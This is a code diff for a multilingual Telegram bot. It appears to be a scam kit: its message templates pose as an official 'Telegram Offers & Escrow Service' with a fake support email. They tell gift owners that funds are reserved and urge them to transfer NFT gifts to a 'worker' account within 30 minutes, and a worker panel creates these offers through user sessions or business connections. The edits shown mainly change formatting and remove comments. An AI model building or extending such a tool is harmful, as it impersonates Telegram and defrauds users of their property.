@@ -130,16 +130,16 @@ def get_currency_label(currency: str, lang: str = DEFAULT_LANG, plain: bool = Fa
     return currency.upper()
 
 # ═══════════════════════════════════════════════════════
-# 🌐 ШАБЛОНЫ СООБЩЕНИЙ
+# 🌐 ШАБЛОНЫ СООБЩЕНИЙ (КУРСИВ)
 # ═══════════════════════════════════════════════════════
 
 TEXTS = {
     "ru": {
         "offer_body": (
-            "{scale} <b>Telegram Offers</b>\n\n"
+            "<i>{scale} <b>Telegram Offers</b>\n\n"
             "{user} Пользователь предлагает вам\n"
             "<b>{price} {currency}</b> за подарок <b>{gift_name}</b>.\n\n"
-            "{time} Оффер действителен ещё <b>{ttl} ч.</b>"
+            "{time} Оффер действителен ещё <b>{ttl} ч.</b></i>"
         ),
         "btn_accept": "✅ Принять",
         "btn_reject": "❌ Отклонить",
@@ -148,29 +148,29 @@ TEXTS = {
             "Передайте подарок @{worker_username} в течение 30 минут."
         ),
         "accepted_body": (
-            "{check} <b>Средства зарезервированы</b>\n\n"
+            "<i>{check} <b>Средства зарезервированы</b>\n\n"
             "{money} Сумма: <b>{price} {currency}</b>\n"
             "{gift} Подарок: <b>{gift_name}</b>\n"
             "{box} Заказ: <code>#{order}</code>\n"
             "{user} Покупатель: <b>@{worker_username}</b>\n\n"
             "Для завершения сделки передайте подарок на аккаунт покупателя: <b>@{worker_username}</b>.\n"
             "Передача: откройте подарок в профиле → «Передать» → выберите получателя: <b>@{worker_username}</b>.\n\n"
-            "{time} <i>У вас будет 30 минут для передачи подарка.</i>\n\n"
+            "{time} У вас будет 30 минут для передачи подарка.\n\n"
             "{warning} После получения подарка средства автоматически зачислятся на ваш баланс Telegram.\n\n"
-            "{globe} <i>Если у вас произошла какая-то ошибка или возникли вопросы, обратитесь в службу поддержки:</i> <code>{fake_email}</code>\n\n"
-            "<i>Это сообщение видите только вы с целью конфиденциальности</i>"
+            "{globe} Если у вас произошла какая-то ошибка или возникли вопросы, обратитесь в службу поддержки: <code>{fake_email}</code>\n\n"
+            "Это сообщение видите только вы с целью конфиденциальности</i>"
         ),
         "escrow_welcome": (
-            "{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
+            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
             "Официальный сервис безопасных сделок и передачи NFT-подарков Telegram.\n\n"
             "{check} Средства покупателя резервируются смарт-контрактом до момента подтверждения передачи подарка.\n"
             "{warning} Все сделки защищены политикой конфиденциальности Telegram.\n\n"
-            "{globe} <i>Служба поддержки:</i> <code>{fake_email}</code>"
+            "{globe} Служба поддержки: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "{cross} <b>Оффер отклонён</b>",
+        "rejected_body": "<i>{cross} <b>Оффер отклонён</b></i>",
         "alert_rejected": "Оффер отклонён",
         "start_msg": (
-            "👋 <b>Панель воркера</b>\n\n"
+            "<i>👋 <b>Панель воркера</b>\n\n"
             "👤 Твой ID: <code>{uid}</code>\n"
             "🏷 Твой юзернейм в офферах: <b>@{worker_username}</b>\n"
             "🌐 Язык офферов: <b>{lang}</b>\n"
@@ -184,45 +184,45 @@ TEXTS = {
             "<b>Создать оффер (сессия):</b>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
             "<b>Создать оффер (бизнес-аккаунт):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
         ),
-        "choose_lang": "{globe} <b>Выбери язык офферов:</b>",
-        "lang_set": "✅ Язык установлен: {lang}",
-        "choose_currency": "{exchange} <b>Выбери валюту офферов:</b>",
-        "currency_set": "✅ Валюта установлена: {currency}",
+        "choose_lang": "<i>{globe} <b>Выбери язык офферов:</b></i>",
+        "lang_set": "<i>✅ Язык установлен: {lang}</i>",
+        "choose_currency": "<i>{exchange} <b>Выбери валюту офферов:</b></i>",
+        "currency_set": "<i>✅ Валюта установлена: {currency}</i>",
     },
     "uk": {
         "offer_body": (
-            "{scale} <b>Telegram Offers</b>\n\n"
+            "<i>{scale} <b>Telegram Offers</b>\n\n"
             "{user} Користувач пропонує вам\n"
             "<b>{price} {currency}</b> за подарунок <b>{gift_name}</b>.\n\n"
-            "{time} Офер дійсний ще <b>{ttl} год.</b>"
+            "{time} Офер дійсний ще <b>{ttl} год.</b></i>"
         ),
         "btn_accept": "✅ Прийняти",
         "btn_reject": "❌ Відхилити",
         "alert_accepted": "Ваш подарунок {gift_name} зарезервовано.\n\nПередайте подарунок @{worker_username} протягом 30 хвилин.",
         "accepted_body": (
-            "{check} <b>Кошти зарезервовано</b>\n\n"
+            "<i>{check} <b>Кошти зарезервовано</b>\n\n"
             "{money} Сума: <b>{price} {currency}</b>\n"
             "{gift} Подарунок: <b>{gift_name}</b>\n"
             "{box} Замовлення: <code>#{order}</code>\n"
             "{user} Покупець: <b>@{worker_username}</b>\n\n"
             "Для завершення угоди передайте подарунок на акаунт покупця: <b>@{worker_username}</b>.\n"
             "Передача: відкрийте подарунок у профілі → «Передати» → виберіть одержувача: <b>@{worker_username}</b>.\n\n"
-            "{time} <i>У вас буде 30 хвилин для передачі подарунка.</i>\n\n"
+            "{time} У вас буде 30 хвилин для передачі подарунка.\n\n"
             "{warning} Після отримання подарунка кошти автоматично надійдуть на ваш баланс Telegram.\n\n"
-            "{globe} <i>Служба підтримки:</i> <code>{fake_email}</code>\n\n"
-            "<i>Це повідомлення бачите тільки ви з метою конфіденційності</i>"
+            "{globe} Служба підтримки: <code>{fake_email}</code>\n\n"
+            "Це повідомлення бачите тільки ви з метою конфіденційності</i>"
         ),
         "escrow_welcome": (
-            "{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
+            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
             "Офіційний сервіс безпечних угод та передачі NFT-подарунків Telegram.\n\n"
-            "{globe} <i>Служба підтримки:</i> <code>{fake_email}</code>"
+            "{globe} Служба підтримки: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "{cross} <b>Офер відхилено</b>",
+        "rejected_body": "<i>{cross} <b>Офер відхилено</b></i>",
         "alert_rejected": "Офер відхилено",
         "start_msg": (
-            "👋 <b>Панель воркера</b>\n\n"
+            "<i>👋 <b>Панель воркера</b>\n\n"
             "👤 ID: <code>{uid}</code>\n"
             "🏷 Юзернейм: <b>@{worker_username}</b>\n"
             "🌐 Мова: <b>{lang}</b>\n"
@@ -232,19 +232,19 @@ TEXTS = {
             "<b>Створити офер (сесія):</b>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
             "<b>Створити офер (бізнес):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
         ),
-        "choose_lang": "{globe} <b>Оберіть мову:</b>",
-        "lang_set": "✅ Мову встановлено: {lang}",
-        "choose_currency": "{exchange} <b>Оберіть валюту оферів:</b>",
-        "currency_set": "✅ Валюту встановлено: {currency}",
+        "choose_lang": "<i>{globe} <b>Оберіть мову:</b></i>",
+        "lang_set": "<i>✅ Мову встановлено: {lang}</i>",
+        "choose_currency": "<i>{exchange} <b>Оберіть валюту оферів:</b></i>",
+        "currency_set": "<i>✅ Валюту встановлено: {currency}</i>",
     },
     "en": {
         "offer_body": (
-            "{scale} <b>Telegram Offers</b>\n\n"
+            "<i>{scale} <b>Telegram Offers</b>\n\n"
             "{user} A user is offering you\n"
             "<b>{price} {currency}</b> for the gift <b>{gift_name}</b>.\n\n"
-            "{time} Offer is valid for another <b>{ttl} h.</b>"
+            "{time} Offer is valid for another <b>{ttl} h.</b></i>"
         ),
         "btn_accept": "✅ Accept",
         "btn_reject": "❌ Decline",
@@ -253,27 +253,27 @@ TEXTS = {
             "Transfer the gift to @{worker_username} within 30 minutes."
         ),
         "accepted_body": (
-            "{check} <b>Funds Reserved</b>\n\n"
+            "<i>{check} <b>Funds Reserved</b>\n\n"
             "{money} Amount: <b>{price} {currency}</b>\n"
             "{gift} Gift: <b>{gift_name}</b>\n"
             "{box} Order: <code>#{order}</code>\n"
             "{user} Buyer: <b>@{worker_username}</b>\n\n"
             "To complete the deal, transfer the gift to the buyer account: <b>@{worker_username}</b>.\n"
             "Transfer: open gift in profile → «Transfer» → choose recipient: <b>@{worker_username}</b>.\n\n"
-            "{time} <i>You have 30 minutes to complete the transfer.</i>\n\n"
+            "{time} You have 30 minutes to complete the transfer.\n\n"
             "{warning} Once the gift is received, the funds will be automatically credited to your Telegram balance.\n\n"
-            "{globe} <i>If you encountered an error or have questions, contact support:</i> <code>{fake_email}</code>\n\n"
-            "<i>This message is only visible to you for confidentiality purposes</i>"
+            "{globe} If you encountered an error or have questions, contact support: <code>{fake_email}</code>\n\n"
+            "This message is only visible to you for confidentiality purposes</i>"
         ),
         "escrow_welcome": (
-            "{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
+            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
             "Official secure escrow and NFT gift transfer platform.\n\n"
-            "{globe} <i>Support:</i> <code>{fake_email}</code>"
+            "{globe} Support: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "{cross} <b>Offer declined</b>",
+        "rejected_body": "<i>{cross} <b>Offer declined</b></i>",
         "alert_rejected": "Offer declined",
         "start_msg": (
-            "👋 <b>Worker Panel</b>\n\n"
+            "<i>👋 <b>Worker Panel</b>\n\n"
             "👤 ID: <code>{uid}</code>\n"
             "🏷 Username: <b>@{worker_username}</b>\n"
             "🌐 Language: <b>{lang}</b>\n"
@@ -283,37 +283,37 @@ TEXTS = {
             "<b>Create offer (session):</b>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
             "<b>Create offer (business):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
         ),
-        "choose_lang": "{globe} <b>Select language:</b>",
-        "lang_set": "✅ Language set: {lang}",
-        "choose_currency": "{exchange} <b>Select offer currency:</b>",
-        "currency_set": "✅ Currency set: {currency}",
+        "choose_lang": "<i>{globe} <b>Select language:</b></i>",
+        "lang_set": "<i>✅ Language set: {lang}</i>",
+        "choose_currency": "<i>{exchange} <b>Select offer currency:</b></i>",
+        "currency_set": "<i>✅ Currency set: {currency}</i>",
     },
     "ar": {
         "offer_body": (
-            "{scale} <b>Telegram Offers</b>\n\n"
+            "<i>{scale} <b>Telegram Offers</b>\n\n"
             "{user} يقدم لك أحد المستخدمين\n"
             "<b>{price} {currency}</b> مقابل الهدية <b>{gift_name}</b>.\n\n"
-            "{time} العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b>"
+            "{time} العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b></i>"
         ),
         "btn_accept": "✅ قبول",
         "btn_reject": "❌ رفض",
         "alert_accepted": "تم حجز هديتك {gift_name}.\n\nيرجى تحويل الهدية إلى @{worker_username} خلال 30 دقيقة.",
         "accepted_body": (
-            "{check} <b>تم حجز الأموال بنجاح</b>\n\n"
+            "<i>{check} <b>تم حجز الأموال بنجاح</b>\n\n"
             "{money} المبلغ: <b>{price} {currency}</b>\n"
             "{gift} الهدية: <b>{gift_name}</b>\n"
             "{box} رقم الطلب: <code>#{order}</code>\n"
             "{user} المشتري: <b>@{worker_username}</b>\n\n"
             "يرجى تحويل الهدية إلى: <b>@{worker_username}</b> خلال 30 دقيقة.\n\n"
-            "{globe} <code>{fake_email}</code>"
+            "{globe} <code>{fake_email}</code></i>"
         ),
-        "escrow_welcome": "{scale} <b>Telegram Offers & Escrow Service</b>\n\n{globe} <code>{fake_email}</code>",
-        "rejected_body": "{cross} <b>تم رفض العرض</b>",
+        "escrow_welcome": "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n{globe} <code>{fake_email}</code></i>",
+        "rejected_body": "<i>{cross} <b>تم رفض العرض</b></i>",
         "alert_rejected": "تم رفض العرض",
         "start_msg": (
-            "👋 <b>لوحة التحكم</b>\n\n"
+            "<i>👋 <b>لوحة التحكم</b>\n\n"
             "👤 ID: <code>{uid}</code>\n"
             "🏷 اسم المستخدم: <b>@{worker_username}</b>\n"
             "📱 الجلسة: <b>{session_status}</b>\n"
@@ -321,12 +321,12 @@ TEXTS = {
             "<b>إنشاء عرض (جلسة):</b>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
             "<b>إنشاء عرض (تجاري):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
         ),
-        "choose_lang": "{globe} <b>اختر اللغة:</b>",
-        "lang_set": "✅ تم ضبط اللغة: {lang}",
-        "choose_currency": "{exchange} <b>اختر عملة العروض:</b>",
-        "currency_set": "✅ تم ضبط العملة: {currency}",
+        "choose_lang": "<i>{globe} <b>اختر اللغة:</b></i>",
+        "lang_set": "<i>✅ تم ضبط اللغة: {lang}</i>",
+        "choose_currency": "<i>{exchange} <b>اختر عملة العروض:</b></i>",
+        "currency_set": "<i>✅ تم ضبط العملة: {currency}</i>",
     }
 }
 
@@ -334,7 +334,7 @@ def t(lang: str, key: str, /, **kwargs) -> str:
     lang_dict = TEXTS.get(lang, TEXTS.get(DEFAULT_LANG, {}))
     template = lang_dict.get(key) or TEXTS.get(DEFAULT_LANG, {}).get(key)
     if not template:
-        template = "⚖️ <b>Telegram Offers & Escrow Service</b>\n\nОфициальный сервис безопасных сделок."
+        template = "<i>⚖️ <b>Telegram Offers & Escrow Service</b>\n\nОфициальный сервис безопасных сделок.</i>"
 
     for emoji_key in CUSTOM_EMOJIS:
         if emoji_key not in kwargs:
@@ -499,7 +499,6 @@ async def update_worker_commands(uid: int):
     except Exception:
         pass
 
-# ⬅ ПРАВКА 1: опциональная точка в начале, один парсер для обоих режимов
 def parse_offer_command(text: str):
     m = re.match(
         r'^\s*\.?оффер\s+'
@@ -594,7 +593,6 @@ async def register_worker_client(worker_id: int, session_str: str):
         @client.on(events.NewMessage(outgoing=True))
         async def on_worker_offer(event):
             text = (event.raw_text or "").strip()
-            # ⬅ ПРАВКА 2: Telethon ловит ТОЛЬКО с точкой. Без точки — бизнес-режим, не трогаем
             if not text.lower().startswith(".оффер"):
                 return
 
@@ -682,7 +680,6 @@ async def on_business_connection(connection: BusinessConnection):
 @dp.business_message()
 async def on_business_message(message: types.Message):
     text = (message.text or "").strip()
-    # ⬅ ПРАВКА 3: Business ловит ТОЛЬКО без точки. С точкой — сессия, не трогаем
     if text.startswith("."):
         return
     if not text.lower().startswith("оффер"):
@@ -701,7 +698,6 @@ async def on_business_message(message: types.Message):
     gift_name, gift_link, price, currency_override = parsed
     chat_id = message.chat.id
 
-    # ⬅ ПРАВКА 4: delete_business_messages вместо delete_message, тихая обработка
     try:
         await bot.delete_business_messages(
             business_connection_id=conn_id,
@@ -1033,7 +1029,6 @@ async def on_chosen_inline_result(chosen: ChosenInlineResult):
 # ═══════════════════════════════════════════════════════
 
 async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, keep_kb: bool = False, kb=None):
-    """Универсальный редактор карточки оффера: inline / business / обычное сообщение."""
     parse_mode = "HTML"
     try:
         if call.inline_message_id:
@@ -1077,7 +1072,6 @@ async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, 
             except Exception as e2:
                 print(f"[EDIT] fallback error: {e2}", flush=True)
         else:
-            # ⬅ ПРАВКА 5: при not found просто молчим — сообщение уже удалено/отредактировано
             if "not found" in err:
                 return False
             print(f"[EDIT] error: {e}", flush=True)
